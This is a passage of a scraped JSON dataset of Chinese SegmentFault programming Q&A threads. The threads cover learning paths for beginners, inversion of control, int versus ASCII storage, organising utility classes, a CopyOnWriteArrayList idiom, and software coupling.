<strong>其实每一个程序员心里都明白，自己这些东西，学的时候并不比其它专业难，所以自然也不会高档到哪里去</strong>。</p>\n<h3>咬文嚼字的孔已己作风：</h3>\n<p>我见过一本女生的《计算机网络原理》教材，这个女生像小学生一样在书上划满了横杠杠，笔记做得满满的，打印出来一定比教材还厚。 我不明白的是，像计算机网络原理这样的课程有必要做笔记？ 我们的应试教育的确害了不少学生，在上《原理》这一类课程的时候许多学生像学《马列原理》一样逐字背诵记忆。 这乃是我见过的最愚蠢的行为。 <strong>所谓《原理》，即是需要掌握它为什么这样做，学习why，而不是how（怎样做）</strong>。 极端认真的学生背下以太网的网线最大长度，数据帧的长度，每个字段的意义，IP报头的格式等等，但是忘了路由的原则，忘了TCP/IP协议设计的宗旨。 总之许多人花了大量的时间把书背得滚瓜烂熟却等于什么也没学。</p>\n<p>在学习编程的时候这些学生也是这样，他们确切的记得C++语法的各个细节。 看完了C++ 教程后看《<a href=\"http://126.am/rxAhO3\" rel=\"nofollow\">Thinking in C++</a>》（确实是好书），《<a href=\"http://126.am/r5FtZ3\" rel=\"nofollow\">Inside C++</a>》，《C++ reference》，this C++, that C++……， 然后是网上各种各样的关于C++语法的奇闻逸事，然后发现自己又忘了C++的一些语法，最后回头继续恶补…。</p>\n<p>有个师弟就跟我说：“C++太难了，学了这里忘了那里，学了继承忘了模板。”</p>\n<p>我的回答道：“你不去学就容易了”。</p>\n<p>我并没有教坏他，只是告诉他，死抠C++的语法就和孔已己炫耀茴香豆的茴字有几种写法一样毫无意义。 你根本不需要对的C++语法太关心，动手编程就是了，有不记得的地方一查MSDN就立马搞定。 我有个结论就是，<strong>实际的开发过程中对程序语法的了解是最微不足道的知识</strong>。 这是为什么我在为同学用Basic（我以前从没有学过它）写一个小程序的时候，只花了半个小时看了看语法，然后再用半个小时完成了程序， 而一个小时后我又完全忘记了Basic 的所有关键字。</p>\n<h3>不顾基础，盲目追赶时髦技术：</h3>\n<p>终于点到题目上来了。 大多数的人都希望自己的东西能够马上跑起来，变成钱。 这种想法对一个已经进入职业领域的程序员或者项目经理来说是合理的，而且IT技术进步是如此的快，不跟进就是失业。 但是对于初学者来说（尤其是时间充裕的大中专在校生），这种想法是另人费解的。</p>\n<p>一个并未进入到行业竞争中来的初学者最大的资本便是他有足够的时间沉下心来学习基础性的东西，学习why而不是how。 时髦的技术往往容易掌握，而且越来越容易掌握，这是商业利益的驱使，为了最大化的降低软件开发的成本。 但在IT领域内的现实就是这样，<strong>越容易掌握的东西，学习的人越多，而且淘汰得越快</strong>。 每一次新的技术出来，都有许多初学者跟进，这些初学者由于缺乏必要的基础而使得自己在跟进的过程中花费大量的时间，而等他学会了，这种技术也快淘汰了。</p>\n<p>基础的课程，比方数据结构，操作系统原理等等虽然不能让你立马就实现一个Linux（这是许多人嘲笑理论课程无用的原因）， 但它们能够显著的减少你在学习新技术时学习曲线的坡度。 而且对于许多关键的技术（比方Win32 SDK 程序的设计，DDK的编程）来说甚至是不可或缺的。</p>\n<p>一个活生生的例子是我和我的一个同学，在大一时我还找不到开机按纽，他已经会写些简单的汇编程序了。 我把大二的所有时间花在了汇编，计算机体系结构，数据结构，操作系统原理等等这些课程的学习上，而他则开始学习HTML和VB，并追赶ASP的潮流。 大三的时候我开始学习Windows 操作系统原理，学习SDK编程，时间是漫长的，这时我才能够用VC开发出象模象样的应用程序。 我曾一度因为同学的程序已经能够运行而自己还在学习如何创建对话框而懊恼不已，但临到毕业才发现自己的选择是何等的正确。 和我谈判的公司开出的薪水是他的两倍还多。</p>\n<p>下面有一个不很恰当的比方：假设学习VB编程需要 4个月，学习基础课程和VC的程序设计需要1年。 那么如果你先学VB，再来学习后者，时间不会减少，还是1年，而反过来，如果先学习后者，再来学VB，也许你只需要1个星期就能学得非常熟练。</p>\n<h2>几个重要的基础课程</h2>\n<p>如果你是学生，或者如果你有充足的时间。我建议你仔细的掌握下面的知识。 我的建议是针对那些希望在IT技术上有所成就的初学者。 同时我还列出了一些书目，这些书应该都还可以在书店买到。 说实在的，我在读其他人的文章时最大的心愿就是希望作者列出一个书单。</p>\n<p><strong>大学英语</strong> －不要觉得好笑。我极力推荐这门课程是因为没有专业文档的阅读能力是不可想象的。 中文的翻译往往在猴年马月才会出来，而现在的许多出版社干脆就直接把E文印刷上去。 学习的方法是强迫自己看原版的教材，开始会看不懂，用多了自然熟练。 吃得苦下得狠心绝对是任何行业都需要的品质。</p>\n<p><strong>计算机体系结构和汇编语言</strong> －关于体系结构的书遍地都是，而且也大同小异， 倒是汇编有一本非常好的书《80x86汇编语言程序设计教程》（清华大学出版社，黑色封面，杨季文著）。 你需要着重学习386后保护模式的程序设计。否则你在学习现代操作系统底层的一些东西的时候会觉得是在看天书。</p>\n<p><strong>计算机操作系统原理</strong> －我们的开发总是在特定的操作系统上进行，如果不是，只有一种可能：你在自己实现一个操作系统。 无论如何，操作系统原理是必读的。这就象我们为一个芯片制作外围设备时，芯片基本的工作时序是必需了解的。 这一类书也很多，我没有发现哪一本书非常出众。 只是觉得在看完了这些书后如果有空就应该看看《Inside Windows 2000》(微软出版社，我看的是E文版的，中文的书名想必是Windows 2000 技术内幕之类吧)。 关于学习它的必要性，ZDNET上的另一篇文章已经有过论述。</p>\n<p><strong>数据结构和算法</strong> －这门课程能够决定一个人程序设计水平的高低，是一门核心课程。我首选的是清华版的（朱战立，刘天时）。 很多人喜欢买C++版的，但我觉得没有必要。C++的语法让算法实现过程变得复杂多了，而且许多老师喜欢用模块这一东西让算法变得更复杂。 倒是在学完了C版的书以后再来浏览一下 C++的版的书是最好的。</p>\n<p><strong>软件工程</strong> －这门课程是越到后来就越发现它的重要，虽然刚开始看时就象看马哲一样不知所云。 我的建议是看《实用软件工程》（黄色，清华）。 不要花太多的时间去记条条框框，看不懂就跳过去。 在每次自己完成了一个软件设计任务（不管是练习还是工作）以后再来回顾回顾，每次都会有收获。</p>\n<p><strong>Windows 程序设计</strong> －《北京大学出版社，Petzold著》我建议任何企图设计Windows 程序的人在学习VC以前仔细的学完它。 而且前面的那本《Inside Windows 2000》也最好放到这本书的后面读。 在这本书中，没有C++，没有GUI，没有控件。有的就是如何用原始的C语言来完成Windows 程序设计。 在学完了它以后，你才会发现VC其实是很容易学的。千万不要在没有看完这本书以前提前学习VC，你最好碰都不要碰。 我知道的许多名校甚至都已经用它作为教材进行授课。可见其重要。</p>\n<p>上面的几门课程我认为是必学的重要课程（如果你想做Windows 程序员）。</p>\n<p>对于其它的课程有这样简单的选择方法：<strong>如果你是计算机系的，请学好你所有的专业基础课</strong>。 如果不是，请参照计算机系的课程表。 如果你发现自己看一本书时无法看下去了，请翻到书的最后，看看它的参考文献，找到它们并学习它们，再回头看这本书。 如果一本书的书名中带有“原理”两个字，你一定不要去记忆它其中的细节，你应该以一天至少50页的速度掌握其要领。 尽可能多的在计算机上实践一种理论或者算法。</p>\n<h2>日三省乎己</h2>\n<p>每天读的书太多，容易让人迷失方向。看看我以前整理的<a href=\"http://justjavac.com/other/2012/05/15/qualified-programmer-should-read-what-books.html\" rel=\"nofollow\">一个合格程序员应该看哪些书</a>，如果原文被墙，可以到CSDN看。 一定要在每天晚上想想自己学了些什么，还有些什么相关的东西需要掌握，自己对什么最感兴趣，在一本书上花的时间太长还是不够等等。 同时也应该多想想未来最有可能出现的应用，这样能够让你不是追赶技术潮流而是引领技术潮流。 同时，努力使用现在已经掌握的技术和理论去制作具有一定新意的东西。 坚持这样做能够让你真正成为一个软件“研发者”而不仅仅是一个CODER。</p>\n<h2>把最多的时间花在学习上</h2>\n<p>这是对初学者最后的忠告。 <strong>把每个星期玩CS或者CS的时间压缩到最少</strong>，不玩它们是最好的。 同时，如果你的ASP技术已经能够来钱，甚至有公司请你兼职的话，这就证明你的天分能够保证你在努力的学习之后取得更好的收益，你应该去做更复杂的东西。 <strong>眼光放长远一些</strong>，这无论是对谁都是适用的。</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000213444\">\n<p>想学习编程，但是不知道是学习c开始还是java开始，很纠结！\n各位高手给点建议。</p>\n</div>",
      "favourite": "17",
      "glance": "17.2k",
      "tags": [
        "编程",
        "c",
        "java"
      ],
      "time": "2013-06-15",
      "title": "开始学习编程学习c开始还是java？",
      "url": "https://segmentfault.com/q/1010000000213444"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000757160\">\n<blockquote>\n<p>Don't call me, I will call you</p>\n</blockquote>\n<h3>正常流程</h3>\n<p>你去图书馆借书，但是没有。</p>\n<p>于是你回家了。</p>\n<p>然后你每个天去一趟图书馆，看你的书到了没有。</p>\n<p>如果还没有，那么你回家，继续等……</p>\n<p>第二天，再去看，……</p>\n<p>一直到有了这本书。</p>\n<h3>Ioc</h3>\n<p>你去图书馆借书，但是没有。</p>\n<p>于是你<strong>登记了一下</strong>，就回家了。</p>\n<p>回到家，刷刷微博，刷刷sf，撸撸代码。</p>\n<p>等书到了，管理员通知你。</p>\n<p>你去拿书。</p>\n<hr>\n<blockquote>\n<p>Don't call me, I will call you</p>\n</blockquote>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000756914\">\n<p>IoC就是让框架为我们创建些东西。</p>\n<pre><code>App::bind('sms', function () {\n   // Create a new SMS component.\n   $sms = new SMSClient;\n   $sms-&gt;setUsername('shauna');\n   $sms-&gt;setPassword('1_5t341_c4t5!');\n   // Return the created SMS component.\n   return $sms;\n});\n</code></pre>\n<p>据Clouser function特征,上面代的代码不会创建$sms对象。<br>\n$app-&gt;make('sms')的时候，$sms对象才被创建。所谓的反转大概就是按需创建吧。用的时候才触发创建，不是创建好了等着用。</br></p>\n<p>因为程序员本身是农民工的一种，但是又想装的高大上一些，用以自赏，所以创建了这个很NB的术语，装的好像搞原子弹的。不用太在意。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000757198\">\n<p>我试着搜了一下，中文资料基本都把IoC（控制翻转）和DI（依赖注入）混为一谈，就连<a href=\"http://stackoverflow.com/questions/3058/what-is-inversion-of-control\" rel=\"nofollow\">StackOverflow上的第一位答案</a>也犯了同样的问题（幸好下面有高票的反对评论，否则我的世界观都快坏掉了）</p>\n<p>控制翻转是代码复用的一种模式（注意不是设计模式）</p>\n<p>一般（非IoC）的复用，通常是用户代码调用组件（任意形式的被复用的代码，本答案中统称为组件）。也就是用户代码解决“Why it works, What to do”，组件解决“How to do”，逻辑的入口是用户代码，</p>\n<p>而控制翻转则是组件来调用用户代码，也就是组件解决“Why it works, When to do”，用户代码解决“What to do”，逻辑的入口是组件</p>\n<p>下面是除了DI之外的控制翻转的例子</p>\n<ul>\n<li>接口／虚函数  组件调用接口／虚函数，具体由用户代码实现</li>\n<li>发布订阅（事件）模式  组件触发事件，用户代码订阅事件</li>\n<li>回调  用户代码写回调，组件来调用</li>\n<li>\n<strong>几乎所有能被称之为框架的东西</strong>  用户代码在规定的地方实现具体业务逻辑，剩下的框架负责</li>\n</ul>\n</div>",
      "attention": "24",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000755828\">\n<p>RT，如何理解IoC（Inversion of Control）？如果能写个demo解释最好了。</p>\n</div>",
      "favourite": "19",
      "glance": "3.4k",
      "tags": [
        "php",
        "python",
        "java",
        "ruby"
      ],
      "time": "2014-11-03",
      "title": "如何理解IoC（Inversion of Control）？",
      "url": "https://segmentfault.com/q/1010000000755828"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002716608\">\n<p>这个问题怎么都是负分... 有人来解释一下吗?</p>\n<p>我建议 CoffeeScript, 或者 ES6,<br>\n编写网页是编程人员必备技能, 稍微复杂点的网页就需要用到 JavaScript.<br>\n但是业界普遍认为 JavaScript 优点很多, 缺点比优点多得多,<br>\n所以推荐学习改进版的 CoffeeScript, 或者 ES6.</br></br></br></p>\n<p>教程:<br><a href=\"http://coffee-script.org\" rel=\"nofollow\">http://coffee-script.org</a><br><a href=\"http://javascript.ruanyifeng.com/advanced/ecmascript6.html\" rel=\"nofollow\">http://javascript.ruanyifeng.com/advanced/ecmascript6.html</a></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002719604\">\n<p>你可以现在在线编程网站上试试，比如<a href=\"http://www.hubwiz.com\" rel=\"nofollow\">汇智网</a><a href=\"http://www.hubwiz.com\" rel=\"nofollow\">http://www.hubwiz.com</a>,感觉一下再说。上面有很多课程如c、python、js、nodejs、html、css等等。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002718341\">\n<p>Java C++学一个就好了，都很庞大，你不可能都学好。C和C++其实是不同的语言，不要混为一谈。<br>\n建议再学一门脚本语言（Python、Ruby）和一门函数式语言（Lisp、Scala、Clojure）<br>\n其中Scala和Clojure是基于JVM的，你的Java经验有点能用上。<br>\n我的建议是<br>\nPython-&gt;Java-&gt;c-&gt;Scala (按照这样的先后顺序学习）<br>\n语言学这么多就够了，其他的多学一些框架技术，用于真正的工作吧。</br></br></br></br></br></p>\n</div>",
      "attention": "25",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002716037\">\n<p>我要学习的编程语言有java、C\\C++<br>\n求大家还推荐一门编程语言  作为学校自修课程<br>\n谢谢了。</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "2.1k",
      "tags": [
        "软件开发",
        "c++",
        "c",
        "java",
        "编程语言"
      ],
      "time": "2015-04-29",
      "title": "推荐学习哪门编程语言",
      "url": "https://segmentfault.com/q/1010000002716037"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004941867\">\n<p>ascii里定义的是字符的表达方式，不是数字的表达方式，计算机存储数字和字符串的方式是不一样的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004941971\">\n<p>计算机真正存储的都是二进制，一个字节有8个比特位，用二进制表示，最大可表示11111111，即2的8次方-1，同理4个字节有32个比特位，最大可表示2的32次方-1，你去了解一下微机原理就懂了。同时由于第一位通常是符号位，表示正负，0为正，1为负，所以带符号数就是2的31次方-1。关于int,long,double等的字长是编译器的约定，比如早期16位机的int就是16个bit，最大值是65535，到了最近的VS版本，int都是4个字节32个bit位了。<br>刚才漏掉了ASCII编码的事情，一个ASCII码是占一个字符即8个bit, 你看看那个表就明白了，高4位和低四位来构成一张表，所以最多可以表示256个字符。ASCII实际上是字符串来的。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004943013\">\n<p>字符和数值的表示方法是不同的，ascii码里面的数字不是数值，是用编码表示的字符，因此每个数字字符占7位(扩充的ascii码占8位)。比如12，，用ascii码表示为0110001 0110010(它表示的是一二两个数字字符组成的字符串，并没有十二的大小的涵义)，，而用int则表示为00000000 00000000 00000000  00001010，它表示数值为十二的整数，一二两个数是不可分割的。。总之数值与字符在计算机内表示的方法是不同的，，int不是用ascii码表示的</p>\n</div>",
      "attention": "24",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004941099\">\n<p>我知道这个问题~有点无厘头和傻乎乎。还是想请人解答一下~<br>----------可能目前脑子正处于抽风阶段----------<br>首先，我知道int占4个字节，包含正负2的31次方内的数字，也就是基本可以表示10位数字。<br>那么根据Ascll里，一个数字占用一个字节的规则来思考。<br>我让int按照这种规则来储存数字，是不是应该只能储存最多4位数字？？？<br>还请明白人~指出我这样思考的错误点在哪里？或者告知正确的解答方式~。</br></br></br></br></br></p>\n</div>",
      "favourite": "6",
      "glance": "2.6k",
      "tags": [
        "java",
        "二进制",
        "数据类型",
        "内存"
      ],
      "time": "4-14",
      "title": "int占4字节，一数占一字符，为什么int能表示5位以上的数字?",
      "url": "https://segmentfault.com/q/1010000004941099"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000150453\">\n<p>理论上“对象”应该是由“状态”（数据）与“行为”（逻辑）组合而成，其中状态就是类成员变量，行为就是类成员方法。<br/>\n楼主所说的工具方法，在大多静态语言中，本身就是非面向对象的东西，又如何以面向对象的方式组织？以Java中常用的<a href=\"http://commons.apache.org/lang/\" rel=\"nofollow\" target=\"_blank\" title=\"Apache Commons Lang\">Apache Commons Lang</a>库为例，其中的大半类都是各种静态方法组成，例如StringUtils等——静态方法本身就是纯逻辑，与对象无关，也不会保持状态，可以说和平时我们写过程式语言的函数几乎一模一样，所以这类方法参考Apache Commons库或是java.util包写就好了，也是业内通用的做法。</p><p>但对于楼主提到的这类工具方法，这里我想补充一下，也算对上段“大多静态语言”这个定语的解释。<strong>如果抛开语言限制，仅看面向对象，那么多工具方法的存在其实大半是不合理的</strong>。</p><p>先看一下JDK自带的工具类java.util.Arrays类，随便挑一个方法，例如Arrays.sort(int[])对数字数组排序：</p><pre>public static void sort(int[] a);\npublic static void sort(int[] a, int fromIndex, int toIndex);</pre><p>这个方法的调用为：</p><pre>int[] xx = ...\njava.util.Arrays.sort(xx);\njava.util.Arrays.sort(xx, 1, 10);</pre><p>以上静态方法的方式看似很合理——因为本来就是个排序逻辑嘛，但如果写成这样呢：</p><pre>int[] xx = ...\nxx.sort();\nxx.sort(1, 10);</pre><p>是不是更加OO？我本来就要对数组排序，为何不让数组给自己排序？再看org.apache.commons.StringUtils类，随便找个方法例如：</p><pre>public static boolean isAlpha(CharSequence cs);</pre><p>调用时你更想写成下面哪样？</p><pre>org.apache.commons.StringUtils.isAlpha(aString);</pre><pre>aString.isAlpha();</pre><p>是不是让你想起了 \"string\".trim() \"string\".indexOf() 这些方法？如果你想，可以把StringUtils里的所有方法都变成String的成员方法。。。。。那为毛JDK不把这些东东变成成员方法，而是让它们以静态方法的方式存在于那些丑陋的纯行为类呢？这其实是由各种Java语言特性导致的，例如：</p><ol><li><strong>对null的强制判断</strong>。使得string.isEmpty()有些鸡肋而StringUtils.isEmpty(String s)存在合理</li><li><strong>primitive类型的存在</strong>。使得int[].sort()的实现变为不可能，而int的行为也要靠包装类Integer来进行。</li><li><strong>对象扩展方式单一</strong>。为了保持JDK的精炼，只能在String上提供有限的方法，而由于无法对String类进行扩展所以只能做成静态方法。</li><li>。。。</li></ol><p>看看其他语言的情况：<br/>\n1. JavaScript语言的string没有提供trim()方法，但我们可以扩展：</p><pre>String.prototype.trim = function() { ... }\n\"string \".trim();</pre><p>2. Objective-C中对象扩展除了继承之外还可以使用Category的方式（而且Objective-C中对nil的设定灰常和谐）</p><pre>@interface NSString (Cute)\n- (NSString *)beCute;\n@end\n...\n[@\"string\" beCute];</pre><p>因此，对于楼主的问题回答是：<strong>不是这些类无法归类，而是没有归好类或是语言特性使得很难去归类——只能归成Utils工具类了</strong></p><p>最后，个人在这些年里见过的80%以上的 A.method(b) 其实都是可以变化成 b.method()，做到更加OO。其中最多最坑爹还最被广泛认同的一种写法就是：</p><pre>userManager = ...UserManagerSingleton;\nuserManager.save(user);</pre><p>这里把明明是User的行为（save）拆分到独立的UserManager类里面搞得一个只有行为一个只有状态本就很奇怪了，还要把完全没有状态的UserManager实例化一个singleton出来，做一个OO假象给别人看。。。骗谁呢。。。还好Rod Johnson后来自己也承认Spring提倡的这种写法其实是在延续EJB时代的“事务脚本”，是anti-OO的东东。国内技术环境浮躁，不少人都是从SSH学起，还以为自己一直在写OO的代码，还以为自己懂OO。。。。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000149112\">\n<p>这就是我不提倡纯面向对象的原因之一, 很多时候可以作为一个函数的东东, 一定要被包装成一个类, 加上一个命名空间, 写成一个静态方法.</p><p>如果用一个比较好的语言系统, 应该首先语言标准库就提供很多重要的函数和类</p><p>其次是第三方库, 作为vendor</p><p>然后是本身有价值的东西, 可以有common, 或者内部开源成为一个第三方库, 规范接口.</p><p>我不提倡在一个公司的几个projects之间share common, 否则其他团队的修改会bug/crash你的产品, 不如将原来的common fork出来加以修改.</p><p>最后是和这个项目的直接相关的代码逻辑</p><p>团队沟通是成本最高的, 唯一的办法, 控制开发团队人数</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000148769\">\n<p>对于这种问题，没有什么硬性规定，重要的是团队内部必须形成规范，且团队的每个成员必须遵守这个规范，这样的话，就会降低新加入成员的熟悉成本。</p><p>我们团队内部对于项目公用的一些工具类(类似StringUtils,CollectionUtils等)，也会以Util打成包；对于一些模块内部的共用对象，如果是一些enum类，则会以enums打成包；如果是一些模块(例如module1等)内部层与层之间的对象，则会先以dto命名包，再将其放入用其模块名命名的子包内，对于一些模块之间共用的对象，放入common命名的子包，其他共用的类，也会类似的先按照业务功能命名包名，然后在包内，按照不同模块划分子包。</p><p>最后一点重要的还是形成并遵守规范。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000148689\">\n<p>这种现象在所有的面向对象工程中都会遇到，在我们编码时，对一般的对象比如<a href=\"http://segmentfault.com/t/mvc\" rel=\"tag\">mvc</a>的，我们可以把写好的类文件放到相应的<code>model</code> <code>view</code> <code>controller</code>包里面去。但是对于一些共用类就不那么好处理了，比如一些工具类，或者是共用对象，你对它一个类命名一个软件包吧好像有点浪费，但是他们之间又确实没啥关联。</p><p>很常用的做法是全部放到一个类似<code>util</code>的包里，但是最近看到一篇文章说这样过于简单粗暴，而且其他人也不好理解这样的分层，不知道各位是怎么处理这个问题的。</p>\n</div>",
      "favourite": "13",
      "glance": "3.3k",
      "tags": [
        "java",
        "oop",
        "php"
      ],
      "time": "2012-12-05",
      "title": "在面向对象的编程中如何处理一些无法归类的对象",
      "url": "https://segmentfault.com/q/1010000000148689"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000703565\">\n<p>问题已赞.</p>\n<p>应该还有性能上的考虑. 在java函数栈帧的本地变量里存入对 域成员对象的引用, 相当于一个空间换时间的做法. 毕竟 取本地变量 只需要 aload_x 一条指令; 而取 域成员对象的话, 需要 aload_0 [this],  getfield 两条指令. 且每次从 栈里取值, 应该还有缓存上的 好处.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000702580\">\n<p>好久不用java了。是不是为了防止其它线程修改 <code>lock</code> 的值啊？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000702630\">\n<p>是的。用局部变量 lock 来引用自身的成员变量当然不是必须的。我认为这是编程演进过程所引入的，很可能和内部执行的规范有关。</p>\n<p>例如：内部规范上可能是要求<strong>尽量使用 accessor 来使用成员变量</strong>，避免直接使用。即使需要直接使用，最好先用局部变量来引用它。这样做的好处是，这个函数自身具有很好的完备性。设想如果此类如果修改，将 lock 成员变量取消或者更改类型，如果直接在代码各处引用 lock，势必造成很多修改。而在目前的实现上，不过是将<br><code>final ReentrantLock lock = this.lock;</code> 改成 <code>final ReentrantLock lock = getLock();</code> 影响小得多，语义十分清晰。</br></p>\n<p>同样，对成员变量 array 的引用也是这样，通过使用 accessor getArray()，代码可以将对成员变量的依赖降低到对一个成员函数的依赖，这对维护也非常有好处。</p>\n<p>感谢题主引用了很好的一段程序，提出了一个非常完整的问题。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000702440\">\n<p><code>jdk concurrent</code>包当中的<code>CopyOnWriteArrayList</code>定义了一个数组和一个锁：<br><code>private volatile transient Object[] array;</code><br><code>transient final ReentrantLock lock = new ReentrantLock();</code></br></br></p>\n<p>他的<code>add</code>方法如下：<br><code>public boolean add(E e) {\n        final ReentrantLock lock = this.lock;\n        lock.lock();\n        try {\n            Object[] elements = getArray();\n            int len = elements.length;\n            Object[] newElements = Arrays.copyOf(elements, len + 1);\n            newElements[len] = e;\n            setArray(newElements);\n            return true;\n        } finally {\n            lock.unlock();\n        }\n    }</code></br></p>\n<p>问题：<br><code>add</code>方法中的<code>final ReentrantLock lock = this.lock;</code>这一句是不是必须的？为什么又定义了一个锁，并且实质用的还是全局定义的那个锁。如果直接用<code>this.lock</code>可不可以？<br>\n如果不用<code>getArray</code>直接写成<br><code>int len = array.length;\nObject[] newElements = Arrays.copyOf(array, len + 1);\nnewElements[len] = o;\narray = newElements;</code><br>\n是不是也可以？</br></br></br></br></p>\n</div>",
      "favourite": "2",
      "glance": "1.4k",
      "tags": [
        "java"
      ],
      "time": "2014-09-29",
      "title": "关于CopyOnWriteArrayList源码的疑惑",
      "url": "https://segmentfault.com/q/1010000000702440"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002424624\">\n<p>我也来通俗地讲一讲，说的不好请勿喷。</p>\n<p>简单概括：耦合就是程序中的一部分跟其他部分之间的关系。解耦合就是把必要的耦合理顺，同时尽量减少不必要的耦合（这一句其实就是高内聚低耦合的通俗解释）。</p>\n<p>如何看待耦合取决于你是从什么视角和层次看待一个程序。如果你正在关注的是一个函数或一个类的内部实现，这个粒度就很细。这个时候你关注的可能是如何把函数/类写的漂亮，让它在功能正确的同时又容易理解。你可以通过改善代码的排版、优化算法、将重复的操作封装为一个新的函数、给变量或函数取更有意义的名字等方法来改善它。</p>\n<p>这些方法可以说都跟“高内聚低耦合”有关系。改善代码排版：让代码更有代码的样子，让人更容易看清每句代码的作用和意图。合适的名字：如果你给变量取个名字叫variable，从语意上讲它可以存储任意的值，它的模棱两可的名字让人难以分清它和其他代码的关系（与其他部分有了不必要的耦合），这就会让阅读代码的人茫然不知所措。让变量名字更有意义实际上是高内聚的一种体现，即这个变量你是想让它干嘛的，别人一眼就能看出来。提取函数就更不用说了。</p>\n<p>如果你正在设计一个模块，你关注的可能是模块中的类和对象，也就是如何让模块中的类和对象之间的关系更加简单和清楚。四人帮的《设计模式》这本书主要就是讲这个的，其中的每一个模式都是想办法降低类和对象之间的耦合性。</p>\n<p>那如果你正在设计一个系统呢，你可能就不关心其中的类了（至少一开始不应该关心），你应该将精力集中到这个系统可以分成几个模块、各个模块怎样组合到一起（术语称为“协作”）构成整个系统等问题上。如果你设计的模块还要去关注其他模块的实现细节，那你的系统就太失败了。</p>\n<p>所以，不管你的角度如何，关注的层次高低，降低复杂度都是必要的。这就是耦合和解耦合的核心理念。</p>\n<p>据说任何比喻都是蹩脚的，但我还是想举一个现实中极其高效与低耦合的例子，那就是军队。一个国家的军队少则数万人，多则数百万人，这么庞大的一个系统，它的效率却是惊人的高。为什么？简单来说这要归功于它的几个行事原则：</p>\n<p><strong>纪律严明，令行禁止</strong><br>\n不会出现上级发出命令后找不到人执行，或找到人却不愿意做的尴尬情况（很内聚有木有）</br></p>\n<p><strong>命令不跨级</strong><br>\n除非特殊情况，否则命令都是通过直接上级传达的，司令很少会单独找小兵做事（每一级在上一级看来都高内聚的，同时连长、班长、团长这些头头充当了本级的一个接口，上一级仅通过接口来向下级发命令）<br>\n有人说，如果司令直接找小兵给他做事不是比一级一级传达效率更高吗？no！为什么？原因有几条（注意看，都能跟我们编程时的道理联系上，所以说万物都是想通的）</br></br></p>\n<ol>\n<li><p>司令发出的命令通常都是很大的任务，往往要跨越很多部队甚至兵种，如果让司令一个一个通知不是要累死？（高层抽象不应该直接与底层实现耦合）</p></li>\n<li><p>如果允许任意的跨级下达命令，那就很有可能导致多个上级同时给一个士兵下达不同的命令，那这个士兵不是要累死？（导致系统状态不一致、或分布式系统的忙闲不一等情况）</p></li>\n<li><p>士兵与直接上级之间的沟通通常是无障碍的，但跨级就难说了。哪个士兵擅长做什么事只有他的直接上级最清楚，跨级下达命令时可能会导致任务完成效率下降、甚至任务无法完成的后果（高层抽象往往难以驾驭底层细节，进而导致使用不当甚至误用）</p></li>\n</ol>\n<p><strong>职能划分明确</strong><br>\n部队会按地域、时域、部门、兵种等来划分整个部队的职责，这样一层一层、一块一块地把整个部队分成职责明确的一个个小部分，各个部分相对独立又是一个有机整体，因此想不高效都很难啊。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002421869\">\n<blockquote>\n<p>你正乘坐直升机游览科罗拉多大峡谷，驾驶员——他显然犯了一个错误，在吃鱼，他的午餐——突然呻吟起来，晕了过去。幸运的是，他把你留在了离地面100英尺的地方。你推断，升降杆控制总升力，所以轻轻将其压低可以让直升机平缓降向地面。然而，当你这样做时，却发现生活并非那么简单。直升机的鼻子向下，开始向左盘旋下降。突然间你发现，你驾驶的这个系统，所有的控制输入都有次级效应。压低左手的操作杆，你需要补偿性地向后移动右手柄，并踩右踏板。但这些改变中的每一项都会再次影响所有其他的控制。突然间，你在用一个让人难以置信的复杂系统玩杂耍，其中每一项改变都会影响所有其他的输入。你的工作负担异常巨大：你的手脚在不停地移动，试图平衡所有交互影响的力量。</p>\n</blockquote>\n<p>——《程序员的修炼之道》 我认为所有程序员都应该看，而且每年都应该重新看一遍的书</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" 